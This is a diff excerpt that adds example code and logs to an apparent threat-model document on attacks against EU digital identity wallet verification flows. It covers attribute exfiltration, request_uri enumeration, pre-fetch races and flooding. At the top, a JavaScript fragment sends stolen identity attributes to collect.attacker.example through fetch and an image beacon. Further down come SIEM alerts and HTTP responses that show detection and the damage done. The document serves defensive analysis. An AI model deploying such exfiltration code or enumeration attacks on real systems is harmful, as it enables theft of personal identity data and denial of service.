+    body: JSON.stringify(stolen),
+    mode: 'no-cors',        // bypass CORS — fire-and-forget
+    keepalive: true          // survives page navigation
+  });
+  // Fallback: image beacon for environments blocking fetch
+  new Image().src = `https://collect.attacker.example/px?d=${
+    btoa(JSON.stringify(stolen))
+  }`;
+});
+// ⚠️ Neither the user nor the RP's application logic detects
+// the exfiltration — the RP processes only family_name + date_of_birth.
+```
 
 **Artifact Produced:** Exfiltrated PID attributes (address, nationality, PAN) beyond the RP's authorised scope.
 
@@ -21984,6 +23144,41 @@ The legitimate Wallet scans the QR code and issues an HTTP GET to the `request_u
 
 The JAR returned by the `request_uri` endpoint is a JWS-signed JSON object containing session-specific metadata. While JARs are requests (not responses) and contain no user credentials, they reveal: (a) the RP's attribute collection patterns (which DCQL claims are requested); (b) active session nonces that could be correlated with other attacks; (c) the `client_id` identifying the RP; (d) the RP's verification volume and timing patterns.
 
+```json
+// Decoded JAR payload — returned for every valid request_uri hit
+// Each successful enumeration attempt leaks this entire structure
+{
+  "iss": "bank.example",
+  "aud": "https://self-issued.me/v2",
+  "client_id": "bank.example",
+  "response_uri": "https://bank.example/api/presentations/response",
+  "response_type": "vp_token",
+  "response_mode": "direct_post",
+  "nonce": "n-7f8a3bc1e9d2",
+  "state": "sess_4721",
+  "iat": 1743926400,
+  "exp": 1743926700,
+  "dcql_query": {
+    "credentials": [{
+      "id": "pid",
+      "format": "dc+sd-jwt",
+      "claims": [
+        { "path": ["family_name"] },
+        { "path": ["given_name"] },
+        { "path": ["date_of_birth"] },
+        { "path": ["resident_address"] },
+        { "path": ["personal_identifier"] }
+      ]
+    }]
+  }
+}
+// ⚠️ Leaked intelligence per harvested JAR:
+//   • nonce — can be correlated with replay attacks (§28.2.2)
+//   • dcql_query — reveals this is a full KYC flow (5 PID claims)
+//   • iat/exp — 5-min window reveals verification timing patterns
+//   • state — sequential "sess_4721" confirms the ID predictability
+```
+
 **Artifact Produced:** JAR payload with session metadata — nonce, client_id, DCQL query structure.
 
 </details>
@@ -22023,6 +23218,45 @@ The harvested nonces and session identifiers may be combined with other attack v
 A well-instrumented RP detects the enumeration through anomalous access patterns: (i) high request volume from a single IP or IP range; (ii) sequential `request_uri` path patterns in the request logs; (iii) requests without valid Wallet `User-Agent` strings; (iv) multiple fetches for `request_uri` values that were never issued to any QR code. The RP rate-limits the source and generates a `REQUEST_URI_ENUMERATION_DETECTED` alert.
 
 **Failure Path:** If the RP does not monitor `request_uri` access patterns, the enumeration proceeds undetected for the duration of the `request_uri` TTL window.
+
+```http
+HTTP/1.1 429 Too Many Requests
+Retry-After: 60
+Content-Type: application/json
+X-RateLimit-Limit: 10
+X-RateLimit-Remaining: 0
+X-RateLimit-Reset: 1743927060
+
+{
+  "error": "rate_limit_exceeded",
+  "error_description": "Too many requests to request_uri endpoint. Try again after 60 seconds.",
+  "retry_after": 60
+}
+```
+```json
+// SIEM alert generated by RP's WAF — REQUEST_URI_ENUMERATION_DETECTED
+{
+  "alert_type": "REQUEST_URI_ENUMERATION_DETECTED",
+  "severity": "HIGH",
+  "timestamp": "2026-04-06T10:37:00Z",
+  "source_ip": "203.0.113.42",
+  "source_geo": "RU",
+  "user_agent": "python-requests/2.31.0",
+  "endpoint": "/verify/*",
+  "detection_window_seconds": 30,
+  "requests_in_window": 847,
+  "http_404_count": 831,
+  "http_200_count": 16,
+  "enumeration_pattern": "sequential_integer",
+  "path_range_observed": "/verify/04200 → /verify/05047",
+  "jars_leaked": 16,
+  "action_taken": "IP_BLOCKED_60s",
+  "recommendation": "Migrate request_uri paths to ≥128-bit random tokens (UUID v4)"
+}
+// ⚠️ The 16/847 success ratio confirms sequential IDs.
+// With 128-bit random tokens, the success rate would be ~0
+// for any feasible enumeration volume.
+```
 
 **Artifact Produced:** SIEM alert with source IP, request volume, and enumerated path range.
 
@@ -22102,6 +23336,24 @@ sequenceDiagram
 
 The RP's frontend displays a QR code containing a `request_uri` that the user's Wallet will scan to initiate the OID4VP flow. The QR code is generated via a JavaScript call to the RP's session creation API, which returns the `request_uri` value. This value is typically pushed to the frontend via a WebSocket connection or embedded directly in the rendered page.
 
+```json
+// RP's session creation API response (POST /api/sessions/create)
+// This value is pushed to the frontend and encoded into the QR code
+{
+  "session_id": "sess_b7e2d9a1",
+  "request_uri": "https://bank.example/verify/b7e2d9a1f4c8e3b6",
+  "qr_payload": "openid4vp://authorize?client_id=bank.example&request_uri=https%3A%2F%2Fbank.example%2Fverify%2Fb7e2d9a1f4c8e3b6",
+  "ttl_seconds": 300,
+  "single_use": true,
+  "created_at": "2026-04-06T10:38:00Z",
+  "expires_at": "2026-04-06T10:43:00Z"
+}
+// ⚠️ Race window: from QR display to Wallet fetch (~2-5 seconds)
+// The attacker who intercepts this payload (via WebSocket sniffing,
+// QR camera capture, or frontend scraping) can issue GET /verify/b7e2d...
+// before the legitimate Wallet — consuming the single-use endpoint.
+```
+
 **Artifact Produced:** QR code rendered on the RP's frontend containing the fresh `request_uri` value.
 
 </details>
@@ -22147,6 +23399,52 @@ The legitimate Wallet's fetch arrives after the attacker's. The RP returns `404 
 **Failure Path:** The user's verification fails with no actionable error message. Repeated attempts fail if the attacker continues racing each new QR code.
 
 **Audit Telemetry:** Log all `request_uri` fetch attempts. Any `request_uri` that is fetched more than once (first fetch + Wallet's failed attempt) indicates a pre-fetch race. Alert on patterns where a single source IP consistently fetches `request_uri` values before the associated Wallet.
+
+```http
+# Wallet's fetch: arrives after the attacker consumed the endpoint
+GET /verify/b7e2d9a1f4c8e3b6 HTTP/1.1
+Host: bank.example
+Accept: application/oauth-authz-req+jwt
+User-Agent: EUDI-Wallet/1.0 (Android 15; WSCD=SE)
+
+HTTP/1.1 404 Not Found
+Content-Type: application/json
+
+{
+  "error": "not_found",
+  "error_description": "The request_uri has expired or has already been consumed."
+}
+# ⚠️ The Wallet shows a generic error: "Verification failed. Please try again."
+# The user has no indication that an attacker consumed their session.
+```
+```json
+// RP server-side race detection log — correlates the two fetches
+{
+  "alert_type": "REQUEST_URI_PREFETCH_RACE_DETECTED",
+  "request_uri": "/verify/b7e2d9a1f4c8e3b6",
+  "session_id": "sess_b7e2d9a1",
+  "fetches": [
+    {
+      "sequence": 1,
+      "timestamp": "2026-04-06T10:38:02.341Z",
+      "source_ip": "203.0.113.42",
+      "user_agent": "python-requests/2.31.0",
+      "result": "200_JAR_RETURNED",
+      "note": "⚠️ Non-Wallet User-Agent — likely attacker"
+    },
+    {
+      "sequence": 2,
+      "timestamp": "2026-04-06T10:38:04.876Z",
+      "source_ip": "198.51.100.17",
+      "user_agent": "EUDI-Wallet/1.0 (Android 15; WSCD=SE)",
+      "result": "404_CONSUMED",
+      "note": "Legitimate Wallet — arrived 2.5s late"
+    }
+  ],
+  "race_delta_ms": 2535,
+  "recommendation": "Bind request_uri fetch to DPoP proof or implement 2s grace window"
+}
+```
 
 **Artifact Produced:** HTTP 404 response to the legitimate Wallet; targeted denial of service achieved.
 
@@ -22238,6 +23536,27 @@ In normal operation, the `request_uri` endpoint handles a modest volume of reque
 
 The RP looks up the session associated with the `request_uri` token, retrieves (or generates) the signed JAR, and returns it to the Wallet. This involves a database lookup (session store), JAR construction (JSON serialization + JWS signing), and response serialization. Each request consumes compute resources proportional to the JAR generation complexity.
 
+```http
+# Legitimate Wallet fetch: normal operation
+GET /verify/b7e2d9a1f4c8e3b6a0d5c7e9f1b3a5d7 HTTP/1.1
+Host: bank.example
+Accept: application/oauth-authz-req+jwt
+User-Agent: EUDI-Wallet/1.0 (Android 15; WSCD=SE)
+
+HTTP/1.1 200 OK
+Content-Type: application/oauth-authz-req+jwt
+Cache-Control: no-store
+X-Request-Cost: session-lookup=2ms, jar-sign=8ms, total=12ms
+
+eyJhbGciOiJFUzI1NiIsInR5cCI6Im9hdXRoLWF1dGh6LXJlcStqd3QiLCJraWQi
+OiJycC1rZXktMDAxIn0.eyJpc3MiOiJiYW5rLmV4YW1wbGUiLCJhdWQiOiJodHRw
+czovL3NlbGYtaXNzdWVkLm1lL3YyIiwiY2xpZW50X2lkIjoiYmFuay5leGFtcGxl
+IiwicmVzcG9uc2VfdXJpIjoiaHR0cHM6Ly9iYW5rLmV4YW1wbGUvYXBp...
+# ⚠️ Each legitimate request costs ~12ms server-side.
+# At 10,000 flood requests/s, even if most are 404s (~2ms each),
+# the aggregate load is 20,000ms/s of compute, saturating capacity.
+```
+
 **Artifact Produced:** Signed JAR payload delivered to the requesting Wallet.
 
 </details>
@@ -22268,6 +23587,30 @@ The RP's infrastructure — load balancer, application server, session store —
 During the flood, legitimate Wallet requests to the `request_uri` endpoint either timeout (server too busy to respond within the Wallet's timeout window) or receive `503 Service Unavailable` responses. The user's verification flow fails — they cannot proceed with EUDI identity verification. In high-stakes scenarios (government ID check at a border, financial KYC onboarding), this denial of service has immediate real-world consequences.
 
 **Failure Path:** All EUDI verification flows at the targeted RP are disrupted for the duration of the DDoS. Users cannot verify their identity, and the RP cannot process credential presentations.
+
+```http
+# Legitimate Wallet fetch: during DDoS flood
+GET /verify/c4a9f2e8d1b7a3c5e9f0b2d4a6c8e0f2 HTTP/1.1
+Host: bank.example
+Accept: application/oauth-authz-req+jwt
+User-Agent: EUDI-Wallet/1.0 (iOS 19; WSCD=SE)
+
+HTTP/1.1 503 Service Unavailable
+Retry-After: 30
+Content-Type: application/json
+X-Request-Queue-Depth: 9847
+X-Connection-Pool-Exhausted: true
+
+{
+  "error": "service_unavailable",
+  "error_description": "Verification service temporarily overloaded. Please retry after 30 seconds.",
+  "retry_after": 30
+}
+# ⚠️ The Wallet displays: "Identity verification is currently
+# unavailable. Please try again later."
+# In a border control or KYC scenario, the user is stuck —
+# no fallback identity mechanism exists.
+```
 
 **Artifact Produced:** HTTP 503 or timeout responses to legitimate Wallet requests during the flood.
 
